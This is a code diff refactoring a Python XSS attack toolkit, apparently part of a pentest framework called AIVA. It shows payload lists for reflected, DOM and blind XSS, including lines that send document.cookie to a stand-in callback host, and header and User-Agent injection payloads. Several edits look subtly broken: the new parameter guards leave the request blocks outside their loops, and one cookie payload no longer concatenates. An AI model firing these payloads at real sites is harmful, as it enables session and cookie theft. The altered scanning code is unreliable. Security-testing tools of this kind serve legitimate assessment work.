@@ -40,10 +40,15 @@ from rich.text import Text
 
 # 本地導入 - 已更新為 Features 模組路徑
 from services.aiva_common.schemas import APIResponse
+from services.aiva_common.enums import Severity
 # BaseCapability 待更新為 Features 專用 Base
 
 console = Console()
 logger = logging.getLogger(__name__)
+
+# 常量定義
+DALFOX_PATH = "~/go/bin/dalfox"
+XSS_ALERT_PAYLOAD = 'javascript:alert("XSS")'
 
 
 @dataclass
@@ -51,12 +56,12 @@ class XSSTarget:
     """XSS 攻擊目標"""
     url: str
     method: str = "GET"
-    parameters: Dict[str, str] = None
-    headers: Dict[str, str] = None
-    cookies: Dict[str, str] = None
+    parameters: Optional[Dict[str, str]] = None
+    headers: Optional[Dict[str, str]] = None
+    cookies: Optional[Dict[str, str]] = None
     data: Optional[str] = None
-    forms: List[Dict] = None
-    dom_sources: List[str] = None
+    forms: Optional[List[Dict]] = None
+    dom_sources: Optional[List[str]] = None
     priority: str = "medium"  # high, medium, low
     
     def __post_init__(self):
@@ -86,7 +91,7 @@ class XSSVulnerability:
     exploitation_proof: str
     business_impact: str
     remediation: str
-    timestamp: str = None
+    timestamp: Optional[str] = None
     
     def __post_init__(self):
         if self.timestamp is None:
@@ -104,10 +109,10 @@ class DalfoxIntegration:
         """查找 Dalfox 安裝路徑"""
         possible_paths = [
             "dalfox",
-            "~/go/bin/dalfox",
+            DALFOX_PATH,
             "/usr/local/bin/dalfox",
             "/usr/bin/dalfox",
-            os.path.expanduser("~/go/bin/dalfox")
+            os.path.expanduser(DALFOX_PATH)
         ]
         
         for path in possible_paths:
@@ -145,10 +150,10 @@ class DalfoxIntegration:
                 stderr=asyncio.subprocess.PIPE
             )
             
-            stdout, stderr = await process.communicate()
+            _, stderr = await process.communicate()
             
             if process.returncode == 0:
-                self.dalfox_path = os.path.expanduser("~/go/bin/dalfox")
+                self.dalfox_path = os.path.expanduser(DALFOX_PATH)
                 console.print("[green]✅ Dalfox 安裝成功[/green]")
                 return True
             else:
@@ -159,7 +164,7 @@ class DalfoxIntegration:
             console.print(f"[red]安裝 Dalfox 時發生錯誤: {e}[/red]")
             return False
     
-    async def scan_target(self, target: XSSTarget, options: Dict[str, Any] = None) -> List[XSSVulnerability]:
+    async def scan_target(self, target: XSSTarget, options: Optional[Dict[str, Any]] = None) -> List[XSSVulnerability]:
         """使用 Dalfox 掃描目標"""
         if not self.dalfox_path:
             console.print("[yellow]Dalfox 未安裝，嘗試安裝...[/yellow]")
@@ -234,7 +239,7 @@ class DalfoxIntegration:
                                 xss_type='Reflected XSS',
                                 payload=result.get('payload', ''),
                                 context=result.get('evidence', {}).get('context', 'HTML'),
-                                severity='High',
+                                severity=Severity.HIGH,
                                 confidence=90,
                                 evidence=result.get('evidence', {}).get('text', ''),
                                 exploitation_proof=f"Dalfox detected XSS: {result.get('payload', '')}",
@@ -267,7 +272,7 @@ class XSSPayloadGenerator:
                 '<svg onload=alert("XSS")>',
                 '"><script>alert("XSS")</script>',
                 "'><script>alert('XSS')</script>",
-                'javascript:alert("XSS")',
+                XSS_ALERT_PAYLOAD,
                 '<iframe src="javascript:alert(`XSS`)"></iframe>',
                 '<body onload=alert("XSS")>',
                 '<input autofocus onfocus=alert("XSS")>',
@@ -292,7 +297,7 @@ class XSSPayloadGenerator:
             
             'blind_xss': [
                 '<script>fetch("http://your-server.com/xss?data="+btoa(document.cookie))</script>',
-                '<img src="http://your-server.com/xss.png?data='+document.cookie+'">',
+                '<img src="http://your-server.com/xss.png?data=" + document.cookie + "">',
                 '<script>new Image().src="http://your-server.com/xss?cookie="+document.cookie</script>',
                 '<script>navigator.sendBeacon("http://your-server.com/xss", document.cookie)</script>'
             ],
@@ -335,11 +340,11 @@ class XSSPayloadGenerator:
             'css_context': [
                 '</style><script>alert("XSS")</script>',
                 'expression(alert("XSS"))',
-                'javascript:alert("XSS")'
+                XSS_ALERT_PAYLOAD
             ],
             
             'url_context': [
-                'javascript:alert("XSS")',
+                XSS_ALERT_PAYLOAD,
                 'data:text/html,<script>alert("XSS")</script>',
                 'vbscript:msgbox("XSS")'
             ]
@@ -365,7 +370,7 @@ class XSSPayloadGenerator:
         
         return payloads
     
-    def generate_custom_payload(self, callback_url: str = None, 
+    def generate_custom_payload(self, callback_url: Optional[str] = None, 
                               data_to_extract: str = "document.cookie") -> str:
         """生成自定義載荷"""
         if callback_url:
@@ -440,7 +445,7 @@ class DOMXSSDetector:
                                         xss_type='DOM XSS',
                                         payload=f'#{source} -> {sink}',
                                         context='JavaScript',
-                                        severity='High',
+                                        severity=Severity.HIGH,
                                         confidence=75,
                                         evidence=f'Found {source} -> {sink} pattern in JavaScript',
                                         exploitation_proof=f'Potential DOM XSS via {source} to {sink}',
@@ -472,14 +477,14 @@ class DOMXSSDetector:
                     content = await response.text()
                     
                     # 檢查載荷是否在頁面中被執行
-                    if self._check_xss_execution(content, payload):
+                    if self._check_xss_execution(content):
                         vuln = XSSVulnerability(
                             target_url=test_url,
                             parameter='URL fragment/parameter',
                             xss_type='DOM XSS',
                             payload=payload,
                             context='DOM',
-                            severity='High',
+                            severity=Severity.HIGH,
                             confidence=85,
                             evidence='DOM XSS payload execution detected',
                             exploitation_proof=f'Payload {payload} executed in DOM context',
@@ -493,7 +498,7 @@ class DOMXSSDetector:
         
         return vulnerabilities
     
-    def _check_xss_execution(self, content: str, payload: str) -> bool:
+    def _check_xss_execution(self, content: str) -> bool:
         """檢查 XSS 載荷是否可能被執行"""
         # 簡化的檢查邏輯
         indicators = [
@@ -546,9 +551,10 @@ class StoredXSSDetector:
             unique_payload = payload.replace('Stored XSS', f'Stored XSS {self.unique_marker}')
             
             # 測試所有可能的參數
-            for param_name in target.parameters.keys():
-                test_params = target.parameters.copy()
-                test_params[param_name] = unique_payload
+            if target.parameters:
+                for param_name in target.parameters.keys():
+                    test_params = target.parameters.copy()
+                    test_params[param_name] = unique_payload
                 
                 try:
                     if target.method.upper() == 'POST':
@@ -598,7 +604,7 @@ class StoredXSSDetector:
                                     xss_type='Stored XSS',
                                     payload=f'<script>alert("Stored XSS {self.unique_marker}")</script>',
                                     context='HTML',
-                                    severity='Critical',
+                                    severity=Severity.CRITICAL,
                                     confidence=90,
                                     evidence=f'Stored XSS payload with marker {self.unique_marker} found in response',
                                     exploitation_proof='Stored XSS payload persisted and executed',
@@ -629,7 +635,7 @@ class StoredXSSDetector:
 class BlindXSSDetector:
     """盲 XSS 檢測器"""
     
-    def __init__(self, callback_server: str = None):
+    def __init__(self, callback_server: Optional[str] = None):
         self.callback_server = callback_server or "http://your-blind-xss-server.com"
         self.session_id = f"blind_xss_{int(time.time())}"
         self.payloads = self._generate_blind_payloads()
@@ -649,7 +655,7 @@ class BlindXSSDetector:
         """掃描盲 XSS 漏洞"""
         vulnerabilities = []
         
-        console.print(f"[yellow]注意: 盲 XSS 檢測需要外部回調服務器[/yellow]")
+        console.print("[yellow]注意: 盲 XSS 檢測需要外部回調服務器[/yellow]")
         console.print(f"[cyan]當前回調服務器: {self.callback_server}[/cyan]")
         console.print(f"[cyan]會話 ID: {self.session_id}[/cyan]")
         
@@ -669,7 +675,7 @@ class BlindXSSDetector:
                     xss_type='Blind XSS',
                     payload=self.payloads[0],
                     context='Unknown',
-                    severity='High',
+                    severity=Severity.HIGH,
                     confidence=50,  # 低置信度，需要手動確認
                     evidence=f'Blind XSS payloads submitted with session ID {self.session_id}',
                     exploitation_proof=f'Check callback server {self.callback_server} for requests with ID {self.session_id}',
@@ -702,9 +708,10 @@ class BlindXSSDetector:
     async def _submit_via_forms(self, target: XSSTarget, session: aiohttp.ClientSession):
         """通過表單提交盲 XSS 載荷"""
         for payload in self.payloads:
-            for param_name in target.parameters.keys():
-                test_params = target.parameters.copy()
-                test_params[param_name] = payload
+            if target.parameters:
+                for param_name in target.parameters.keys():
+                    test_params = target.parameters.copy()
+                    test_params[param_name] = payload
                 
                 try:
                     if target.method.upper() == 'POST':
@@ -744,7 +751,7 @@ class BlindXSSDetector:
             f'<img src="{self.callback_server}/header?id={self.session_id}&source=x-forwarded-for">'
         ]
         
-        test_headers = target.headers.copy()
+        test_headers = target.headers.copy() if target.headers else {}
         
         for payload in header_payloads:
             # 測試常見的頭部
@@ -766,7 +773,7 @@ class BlindXSSDetector:
         """通過 User-Agent 提交盲 XSS 載荷"""
         ua_payload = f'Mozilla/5.0 <script>fetch("{self.callback_server}/ua?id={self.session_id}")</script>'
         
-        test_headers = target.headers.copy()
+        test_headers = target.headers.copy() if target.headers else {}
         test_headers['User-Agent'] = ua_payload
         
         try:
@@ -788,7 +795,7 @@ class XSSManager:
         self.blind_detector = BlindXSSDetector()
         self.scan_results = []
     
-    def _parse_target(self, target_url: str, options: Dict[str, Any] = None) -> XSSTarget:
+    def _parse_target(self, target_url: str, options: Optional[Dict[str, Any]] = None) -> XSSTarget:
         """解析目標 URL"""
         options = options or {}
         parsed_url = urlparse(target_url)
@@ -806,7 +813,7 @@ class XSSManager:
             priority=options.get('priority', 'medium')
         )
     
-    async def comprehensive_scan(self, target_url: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
+    async def comprehensive_scan(self, target_url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
         """綜合 XSS 掃描"""
         options = options or {}
         target = self._parse_target(target_url, options)
@@ -879,7 +886,7 @@ class XSSManager:
         # 生成摘要
         results['summary'] = self._generate_summary(results)
         
-        console.print(f"[bold green]✅ XSS 掃描完成！[/bold green]")
+        console.print("[bold green]✅ XSS 掃描完成！[/bold green]")
         return results
     
     async def _custom_xss_scan(self, target: XSSTarget) -> List[XSSVulnerability]:
@@ -892,10 +899,11 @@ class XSSManager:
         try:
             async with aiohttp.ClientSession() as session:
                 # 測試每個參數
-                for param_name in target.parameters.keys():
-                    for payload in payloads[:5]:  # 限制載荷數量
-                        test_params = target.parameters.copy()
-                        test_params[param_name] = payload
+                if target.parameters:
+                    for param_name in target.parameters.keys():
+                        for payload in payloads[:5]:  # 限制載荷數量
+                            test_params = target.parameters.copy()
+                            test_params[param_name] = payload
                         
                         try:
                             if target.method.upper() == 'POST':
@@ -921,7 +929,7 @@ class XSSManager:
                                     xss_type='Reflected XSS',
                                     payload=payload,
                                     context='HTML',
-                                    severity='High',
+                                    severity=Severity.HIGH,
                                     confidence=85,
                                     evidence=f'XSS payload reflected in response: {payload[:50]}...',
                                     exploitation_proof=f'Custom XSS scan detected reflection of payload in parameter {param_name}',
@@ -953,10 +961,10 @@ class XSSManager:
         
         summary = {
             'total_vulnerabilities': len(all_vulns),
-            'critical_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Critical'),
-            'high_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'High'),
-            'medium_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Medium'),
-            'low_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Low'),
+            'critical_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == Severity.CRITICAL),
+            'high_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == Severity.HIGH),
+            'medium_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == Severity.MEDIUM),
+            'low_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == Severity.LOW),
             'xss_types': {
                 'reflected': sum(1 for v in all_vulns if 'Reflected' in v.get('xss_type', '')),
                 'stored': sum(1 for v in all_vulns if 'Stored' in v.get('xss_type', '')),
@@ -975,130 +983,134 @@ class XSSManager:
         return summary
 
 
-class XSSCapability(BaseCapability):
-    """XSS 攻擊能力"""
-    
-    def __init__(self):
-        super().__init__()
-        self.name = "xss_attack_tools"
-        self.version = "1.0.0"
-        self.description = "專業 XSS 攻擊工具集，整合 AIVA 現有功能與 HackingTool 工具"
-        self.dependencies = ["aiohttp", "requests", "beautifulsoup4", "rich"]
-        self.manager = XSSManager()
-    
-    async def initialize(self) -> bool:
-        """初始化能力"""
-        try:
-            console.print("[yellow]初始化 XSS 攻擊工具集...[/yellow]")
-            return True
-        except Exception as e:
-            logger.error(f"初始化失敗: {e}")
-            return False
-    
-    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
-        """執行命令"""
-        try:
-            if command == "comprehensive_scan":
-                target_url = parameters.get('target_url')
-                if not target_url:
-                    return {"success": False, "error": "Missing target_url parameter"}
-                
-                results = await self.manager.comprehensive_scan(target_url, parameters.get('options', {}))
-                return {"success": True, "data": results}
-            
-            elif command == "dalfox_scan":
-                target_url = parameters.get('target_url')
-                if not target_url:
-                    return {"success": False, "error": "Missing target_url parameter"}
-                
-                target = self.manager._parse_target(target_url, parameters.get('options', {}))
-                vulns = await self.manager.dalfox.scan_target(target, parameters.get('dalfox_options', {}))
-                return {"success": True, "data": [asdict(v) for v in vulns]}
-            
-            elif command == "dom_scan":
-                target_url = parameters.get('target_url')
-                if not target_url:
-                    return {"success": False, "error": "Missing target_url parameter"}
-                
-                target = self.manager._parse_target(target_url, parameters.get('options', {}))
-                vulns = await self.manager.dom_detector.scan_dom_xss(target)
-                return {"success": True, "data": [asdict(v) for v in vulns]}
-            
-            elif command == "stored_scan":
-                target_url = parameters.get('target_url')
-                if not target_url:
-                    return {"success": False, "error": "Missing target_url parameter"}
-                
-                target = self.manager._parse_target(target_url, parameters.get('options', {}))
-                vulns = await self.manager.stored_detector.scan_stored_xss(target)
-                return {"success": True, "data": [asdict(v) for v in vulns]}
-            
-            elif command == "blind_scan":
-                target_url = parameters.get('target_url')
-                if not target_url:
-                    return {"success": False, "error": "Missing target_url parameter"}
-                
-                callback_server = parameters.get('callback_server')
-                if callback_server:
-                    self.manager.blind_detector.callback_server = callback_server
-                
-                target = self.manager._parse_target(target_url, parameters.get('options', {}))
-                vulns = await self.manager.blind_detector.scan_blind_xss(target)
-                return {"success": True, "data": [asdict(v) for v in vulns]}
-            
-            elif command == "generate_payloads":
-                xss_type = parameters.get('xss_type', 'basic_reflected')
-                context = parameters.get('context', 'html_context')
-                waf_bypass = parameters.get('waf_bypass', False)
-                
-                payloads = self.manager.payload_generator.generate_payloads(xss_type, context, waf_bypass)
-                return {"success": True, "data": {"payloads": payloads}}
-            
-            elif command == "install_dalfox":
-                success = await self.manager.dalfox.install_dalfox()
-                return {"success": success, "message": "Dalfox installation completed" if success else "Dalfox installation failed"}
-            
-            else:
-                return {"success": False, "error": f"Unknown command: {command}"}
-                
-        except Exception as e:
-            logger.error(f"命令執行失敗: {e}")
-            return {"success": False, "error": str(e)}
-    
-    async def cleanup(self) -> bool:
-        """清理資源"""
-        try:
-            self.manager.scan_results.clear()
-            return True
-        except Exception as e:
-            logger.error(f"清理失敗: {e}")
-            return False
+# 注意: BaseCapability 和 CapabilityRegistry 不屬於 aiva_common v2.0 規範
+# 功能模組應通過 CommandHandler 接口集成,而非 Capability 系統
+# 
+# class XSSCapability(BaseCapability):
+#     """XSS 攻擊能力"""
+#     
+#     def __init__(self):
+#         super().__init__()
+#         self.name = "xss_attack_tools"
+#         self.version = "1.0.0"
+#         self.description = "專業 XSS 攻擊工具集，整合 AIVA 現有功能與 HackingTool 工具"
+#         self.dependencies = ["aiohttp", "requests", "beautifulsoup4", "rich"]
+#         self.manager = XSSManager()
+#     
+#     async def initialize(self) -> bool:
+#         """初始化能力"""
+#         try:
+#             console.print("[yellow]初始化 XSS 攻擊工具集...[/yellow]")
+#             return True
+#         except Exception as e:
+#             logger.error(f"初始化失敗: {e}")
+#             return False
+#     
+#     async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
+#         """執行命令"""
+#         try:
+#             if command == "comprehensive_scan":
+#                 target_url = parameters.get('target_url')
+#                 if not target_url:
+#                     return {"success": False, "error": "Missing target_url parameter"}
+#                 
+#                 results = await self.manager.comprehensive_scan(target_url, parameters.get('options', {}))
+#                 return {"success": True, "data": results}
+#             
+#             elif command == "dalfox_scan":
+#                 target_url = parameters.get('target_url')
+#                 if not target_url:
+#                     return {"success": False, "error": "Missing target_url parameter"}
+#                 
+#                 target = self.manager._parse_target(target_url, parameters.get('options', {}))
+#                 vulns = await self.manager.dalfox.scan_target(target, parameters.get('dalfox_options', {}))
+#                 return {"success": True, "data": [asdict(v) for v in vulns]}
+#             
+#             elif command == "dom_scan":
+#                 target_url = parameters.get('target_url')
+#                 if not target_url:
+#                     return {"success": False, "error": "Missing target_url parameter"}
+#                 
+#                 target = self.manager._parse_target(target_url, parameters.get('options', {}))
+#                 vulns = await self.manager.dom_detector.scan_dom_xss(target)
+#                 return {"success": True, "data": [asdict(v) for v in vulns]}
+#             
+#             elif command == "stored_scan":
+#                 target_url = parameters.get('target_url')
+#                 if not target_url:
+#                     return {"success": False, "error": "Missing target_url parameter"}
+#                 
+#                 target = self.manager._parse_target(target_url, parameters.get('options', {}))
+#                 vulns = await self.manager.stored_detector.scan_stored_xss(target)
+#                 return {"success": True, "data": [asdict(v) for v in vulns]}
+#             
+#             elif command == "blind_scan":
+#                 target_url = parameters.get('target_url')
+#                 if not target_url:
+#                     return {"success": False, "error": "Missing target_url parameter"}
+#                 
+#                 callback_server = parameters.get('callback_server')
+#                 if callback_server:
+#                     self.manager.blind_detector.callback_server = callback_server
+#                 
+#                 target = self.manager._parse_target(target_url, parameters.get('options', {}))
+#                 vulns = await self.manager.blind_detector.scan_blind_xss(target)
+#                 return {"success": True, "data": [asdict(v) for v in vulns]}
+#             
+#             elif command == "generate_payloads":
+#                 xss_type = parameters.get('xss_type', 'basic_reflected')
+#                 context = parameters.get('context', 'html_context')
+#                 waf_bypass = parameters.get('waf_bypass', False)
+#                 
+#                 payloads = self.manager.payload_generator.generate_payloads(xss_type, context, waf_bypass)
+#                 return {"success": True, "data": {"payloads": payloads}}
+#             
+#             elif command == "install_dalfox":
+#                 success = await self.manager.dalfox.install_dalfox()
+#                 return {"success": success, "message": "Dalfox installation completed" if success else "Dalfox installation failed"}
+#             
+#             else:
+#                 return {"success": False, "error": f"Unknown command: {command}"}
+#                 
+#         except Exception as e:
+#             logger.error(f"命令執行失敗: {e}")
+#             return {"success": False, "error": str(e)}
+#     
+#     async def cleanup(self) -> bool:
+#         """清理資源"""
+#         try:
+#             self.manager.scan_results.clear()
+#             return True
+#         except Exception as e:
+#             logger.error(f"清理失敗: {e}")
+#             return False
 
 
-# 註冊能力
-CapabilityRegistry.register("xss_attack_tools", XSSCapability)
+# 註冊能力 - 已棄用,改用 aiva_common CommandHandler 接口
+# CapabilityRegistry.register("xss_attack_tools", XSSCapability)
 
 
 if __name__ == "__main__":
-    # 測試用例
-    async def test_xss_tools():
-        capability = XSSCapability()
-        await capability.initialize()
-        
-        # 測試綜合掃描
-        result = await capability.execute("comprehensive_scan", {
-            "target_url": "http://testhtml5.vulnweb.com/",
-            "options": {
-                "use_dalfox": True,
-                "scan_dom": True,
-                "scan_stored": True,
-                "custom_scan": True
-            }
-        })
-        
-        console.print(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        await capability.cleanup()
-    
-    # 運行測試
-    asyncio.run(test_xss_tools())
+    # 測試用例 - 需要更新為使用 CommandHandler 接口
+    # async def test_xss_tools():
+    #     capability = XSSCapability()
+    #     await capability.initialize()
+    #     
+    #     # 測試綜合掃描
+    #     result = await capability.execute("comprehensive_scan", {
+    #         "target_url": "http://testhtml5.vulnweb.com/",
+    #         "options": {
+    #             "use_dalfox": True,
+    #             "scan_dom": True,
+    #             "scan_stored": True,
+    #             "custom_scan": True
+    #         }
+    #     })
+    #     
+    #     console.print(json.dumps(result, indent=2, ensure_ascii=False))
+    #     
+    #     await capability.cleanup()
+    # 
+    # # 運行測試
+    # asyncio.run(test_xss_tools())
+    pass
